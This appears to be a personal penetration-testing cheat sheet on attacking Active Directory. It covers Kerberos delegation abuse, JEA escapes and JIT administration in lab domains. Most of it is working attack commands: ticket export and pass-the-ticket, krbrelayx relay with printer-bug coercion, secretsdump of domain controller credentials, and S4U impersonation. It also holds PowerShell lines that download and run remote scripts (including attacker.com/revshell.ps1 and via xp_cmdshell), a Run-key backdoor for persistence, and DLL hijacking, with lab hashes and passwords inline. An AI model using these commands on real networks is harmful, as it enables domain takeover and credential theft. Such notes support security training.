# Attacking AD

<details>

<summary>Unconstrained Delegation</summary>

![](<../.gitbook/assets/image (313).png>)

* Allows forwardable TGT --> frontend service is able to perform authentication on behalf of user to any service

## Enumeration

<pre class="language-powershell"><code class="lang-powershell">iex (new-object net.web-client).downloadstring('http://192.168.45.198/PowerView.ps1')
<strong>Get-DomainComputer -Unconstrained
</strong># Domain Controllers are configured with unconstrained delegation by default

#To know the IP of the target
nslookup appsrv01
</code></pre>

## Exploitation

* Must be local admin on the target (eg: appsrv01)
*   3 methods

    * Have domain admin visit the application using uncontrained kerberoast --> dump TGT of admin
      *   ```
          sekurlsa::tickets
          ```

          <figure><img src="../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>


      *   ```
          sekurlsa::tickets /export
          ```

          <figure><img src="../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>


      *   ```
          kerberos::ptt [0;1801fa]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi
          ```

          <figure><img src="../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>


      *   ```powershell
          exit
          # Verify that we have the TGT
          klist
          # Laterally move to DC
          C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd.exe
          ```


    * OR Krbrelayx attack on unconstrained delegation
      *

          <figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>


      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
        *   ```powershell
            # Dump as domain user
            impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
            # Dump as built-in admin
            impacket-secretsdump administrator:2J8u{2e@192.168.187.121
            ```


      * Add an SPN for `attacker.corp.com` on `FILES01$`
        *   ```powershell
            # git clone https://github.com/dirkjanm/krbrelayx.git
            python3 addspn.py -u "corp.com\FILES01$" -p aad3b435b51404eeaad3b435b51404ee:9aa7af9cb73fbb418adf1586e9686931 -s HOST/attacker.corp.com --additional 'dc01.corp.com'
            ```


      * Add a DNS Entry for `attacker.corp.com` in Active Directory
        *   ```powershell
            python3 dnstool.py -u "corp.com\FILES01$" -p aad3b435b51404eeaad3b435b51404ee:9aa7af9cb73fbb418adf1586e9686931 -r 'attacker.corp.com' -d '192.168.45.211' --action add 'dc01.corp.com'
            ```


      * Verify DNS Resolution for Attacker Host
        *   ```powershell
            nslookup attacker.corp.com dc01.corp.com
            ```


      * Start `krbrelayx` to Relay Authenticated TGT
        *   ```powershell
            # aes256-cts-hmac-sha1-96
            python3 krbrelayx.py -aesKey 00ba3cfd9198fa8a6dc795324242810e98c7d36d083bd811fdfe204ef30cc7a7
            ```


      * Trigger Authentication from the DC Using the Print Spooler Bug
        *   ```powershell
            python3 printerbug.py "corp.com/FILES01$"@dc01.corp.com -hashes aad3b435b51404eeaad3b435b51404ee:22a506a9cabc86c93dda21decc4b2e75 "attacker.corp.com"
            ```


        * If errors out --> rerun the impacket secretdump again to obtain the computer hashes
        * Check if got ccache file in the directory
      * Importing the ccache file
        * ```bash
          mv DC01\$@CORP.COM_krbtgt@CORP.COM.ccache administrator.ccache
          export KRB5CCNAME=administrator.ccache
          ```
      * Use the Captured TGT to Dump Credentials from the DC
        *   ```powershell
            impacket-secretsdump -k -no-pass "corp.com/DC01$"@dc01.corp.com
            ```


      * Running Impacket-PsExec for Remote Code Execution
        * ```powershell
          impacket-psexec admin@dc01.corp.com -hashes :<nt hash>
          ```



    * OR Force high-privileged authentication without any user interaction (PrintSpooler)
      *   ```powershell
          Rubeus.exe monitor /interval:5 /filteruser:CDC01$
          SpoolSample.exe <target-machine> <capture-server>
              #SpoolSample.exe CDC01 APPSRV01
          Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo…
          ```


      * Since machine account (CDC01$) is not local admin on DC, can't laterally move to it
      * Can laterally move via:
        * [Golden Ticket](persistence.md#golden-ticket)
        * [Dump administrator hash](lateral-movement.md#dump-domain-admin-hash-from-dc)

</details>

<details>

<summary>Constrained Delegation</summary>

* Solve the double-hop issue while limiting access to only the desired backend service defined in msds-allowedtodelegateto
* S4U2Self --> Allows a service to request Kerberos TGS for any user, including domain admin, without needing their passwords or hash
* S4U2Proxy --> Allows a service to take a TGS from S4U2Self and exchange it for a TGS to a backend service

![](<../.gitbook/assets/image (11) (1) (1).png>)

## Enumeration

*   <pre class="language-powershell"><code class="lang-powershell"><strong>#Powerview
    </strong><strong>Get-DomainUser -TrustedToAuth
    </strong></code></pre>

    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>


* Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc

## Exploitation 1

* Compromise the IISSvc account
  * ```powershell
    # Generate the NTLM hash
    .\Rubeus.exe hash /password:lab
    # Generate TGT for IISSvc
    .\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /nowrap
    ```
* Use S4U2Proxy to get a ticket to MSSQL (SPN listed in msds-allowedtodelegateto field)
  * ```powershell
    .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt

    # .\Rubeus.exe s4u /ticket:doIEpjCCBKKgA… /impersonateuser:administrator /msdsspn:cifs/file01.evil.com /ptt
    ```
*   Execute code on MSSQL

    * Enumerate the user logged in to MSSQL --> logged in as the domain admin

    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## Exploitation 2

* Modify service names in memory to gain unauthorized access to different services on same host
* When TGS is returned by KDC, only server name is encrypted but not service name
* Attacker can modify service name to authenticate to different service
* For instance if msDS-AllowedToDelegateTo is set to MSSQLSvc/cdc01.prod.corp1.com
* Able to change it to access file system (cifs)
*   ```powershell
    .\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com /altservice:CIFS /ptt
    ```



## Exploitation 3

![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)

* Obtain a Ticket Granting Ticket (TGT) for the Service Account
  *   ```powershell
      impacket-getTGT corp.com/iissvc -hashes :12bb0b468b42c76d48a3a5ceb8ade2e9
      export KRB5CCNAME=iissvc.ccache
      ```


* Obtain a Service Ticket (ST) for MSSQL Service as Administrator
  *   ```powershell
      impacket-getST -spn mssqlsvc/sql01.corp.com:1433 -impersonate administrator corp.com/iissvc -k -no-pass
      export KRB5CCNAME=administrator.ccache
      ```


* Access the SQL Server as Administrator
  *   ```powershell
      impacket-mssqlclient sql01.corp.com -k
      ```


* Check the current user and privileges inside SQL Server:
  *   ```sql
      SELECT SYSTEM_USER;
      SELECT IS_SRVROLEMEMBER('sysadmin');
      SELECT CURRENT_USER;
      ```


* Execute Reverse Shell via xp\_cmdshell in sql server
  *   ```sql
      EXECUTE AS LOGIN = 'sa';
      EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
      EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
      EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.211/runall.ps1\")"';
      ```


* To troubleshoot: use the -dc-ip flag and the cifs/file02 SPN for the getST part and -target-ip for the psexec part
  * ```bash
    # Obtain TGT for service acc
    impacket-getTGT cowmotors.com/svc_file

    # Obtain Service Ticket for cifs/file02 as administrator
    export KRB5CCNAME=svc_file.ccache
    impacket-getST -spn cifs/file02 -impersonate administrator -dc-ip DC01 cowmotors.com/svc_file -k -no-pass

    # Check new kerberos ticket
    mv administrator@cifs_file02@COWMOTORS.COM.ccache administrator.ccache
    export KRB5CCNAME=administrator.ccache
    klist

    # PSExec to file02
    impacket-psexec administrator@file02 -target-ip file02 -k -no-pass
    ```

</details>

<details>

<summary>Resource-Based Constrained Delegation</summary>

* msDS-AllowedToActOnBehalfOfOtherIdentity
* Backend service controls which frontend services can delegate on behalf of users
* Attack against RBCD needs to happen from a computer account or a service account with a SPN

### Enumeration

* Find which computers we can modify using GenericWrite permissions
  *   ```powershell
      Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
      ```


  * OR Specifying domain
    *   ```powershell
        Get-DomainComputer -Domain ops.comply.com | Get-ObjectAcl -ResolveGUIDs | Foreach-Object { $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
        ```



### Exploitation

* Add a New Computer Account (myComputer$) to the Domain
  *   ```powershell
      impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
      # impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' ops.comply.com/FILE06$ -hashes :c81c9...
      # impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' COWMOTORS-INT.COM/TERENCE.FORD -k -no-pass -dc-host=dc02.cowmotors-int.com
      ```


* Configure RBCD on the Target Machine (BACKUP01$)
  *   ```powershell
      impacket-rbcd -action write -delegate-to "BACKUP01$" -delegate-from "myComputer$" corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
      # impacket-rbcd -k -no-pass -action write -delegate-to "web01$" -delegate-from "myComputer$" COWMOTORS-INT.COM/TERENCE.FORD
      ```


* Obtain a Service Ticket (ST) as Administrator
  *   ```powershell
      impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x'
      # impacket-getST -spn 'cifs/web01.cowmotors-int.com' -impersonate Administrator -dc-ip 'dc02.cowmotors-int.com' 'cowmotors-int/myComputer$:h4x'
      ```


* Execute Commands as Administrator
  *   <pre class="language-powershell"><code class="lang-powershell"><strong>mv Administrator@cifs_backup01.corp.com@CORP.COM.ccache administrator.ccache
      </strong>export KRB5CCNAME=/home/kali/Documents/offsec/challenges/7/administrator.ccache
      impacket-psexec administrator@backup01.corp.com -k -no-pass
      </code></pre>



[Exploiting GenericWrite on Computer Object](lateral-movement.md#exploiting-genericwrite-on-computer-object)

</details>

<details>

<summary>Exploiting Just Enough Administration (JEA)</summary>

* L**imits administrative privileges** by allowing users to run only specific **approved** commands via PowerShell

- View PowerShell Command History
  *   ```powershell
      (Get-PSReadlineOption).HistorySavePath
      type C:\Users\mary\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
      ```


- Detect if JEA is Enabled on the Target Machine
  *   ```powershell
      Enter-PSSession -ComputerName files02 -ConfigurationName j_fs02
      ```


- **Check if commands are restricted:** ![](<../.gitbook/assets/image (4) (1) (1) (1).png>)
  *   <pre class="language-powershell"><code class="lang-powershell">[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
      # NoLanguageMode --> likely restricted by JEA.

      $ExecutionContext.SessionState.LanguageMode
      <strong>#If full or contrained:
      </strong>&#x26; {IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.211/runall.ps1')}
      </code></pre>


- Enumerate Available Commands in the JEA Session
  *   ```powershell
      Get-Command
      ```


  * If `Copy-Item`, `Move-Item`, or `New-Item` is available, you can **drop malicious payloads**:
    *   ```powershell
        # Exfiltrate sensitive files
        Copy-Item -Path C:\Windows\System32\drivers\etc\hosts -Destination C:\shares\mary\stolen_hosts.txt
        # DLL hijacking for privilege escalation
        Copy-Item C:\shares\payload.dll -Destination "C:\Program Files\VulnerableApp\malicious.dll"
        ```


  * If `Start-Process` is available, it can execute **arbitrary processes**:
    *   ```powershell
        Start-Process "cmd.exe" -ArgumentList "/c whoami"
        Start-Process "powershell.exe" -ArgumentList "-NoP -NonI -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/revshell.ps1')"
        ```


  * If `New-Item` and `Set-ItemProperty` are available, registry values can be modified to establish **persistence**:
    * ```powershell
      New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\malware.exe"
      ```
- Proof-of-Concept: Copying dll to program folder for DLL Hijacking
  * ```powershell
    copy-item C:\shares\home\mary\msasn1.dll -destination "C:\Program Files\FileZilla Server\msasn1.dll"
    ```

</details>

<details>

<summary>Exploiting Just-In-Time Administration Theory</summary>

* Providing temporary, limited administrative access to resources
* Once the time is up, the privileges are revoked automatically
* Requires Privileged Access Management Feature (PAM) to be enabled

## Enumeration

*   ```powershell
    Import-Module .\Microsoft.ActiveDirectory.Management.dll
    Get-Command -Module Microsoft.ActiveDirectory.Management | Where-Object { $_.Name -like "Get-*" }
    ```

    <figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>


*   ```powershell
    Get-ADOptionalFeature -Filter *
    ```

    <figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
*   ```powershell
    Get-NetUser mary | select memberof
    Get-NetGroup j_approve | select member
    ```



## Enumerate GPOs available in the domain

*   ```powershell
    Get-NetGPO | select displayname
    Get-NetGPO l_web01
    ```

    <figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>


* Copy paste path to explorer
* View the group policies in [\\\corp.com\SysVol\corp.com\Policies\\{99EC2AB4-0FD4-406E-8FDA-BE451DEB2AA6}\Machine\Preferences\Groups](file://corp.com/SysVol/corp.com/Policies/%7B99EC2AB4-0FD4-406E-8FDA-BE451DEB2AA6%7D/Machine/Preferences/Groups)
  *

      <figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption><p>Adding la_web to local admin group (RID: 544) on WEB01</p></figcaption></figure>


*   ```powershell
    klist purge
    #So that we can request the new kerberos ticket
    Enter-PSSession -ComputerName WEB01
    ```



</details>
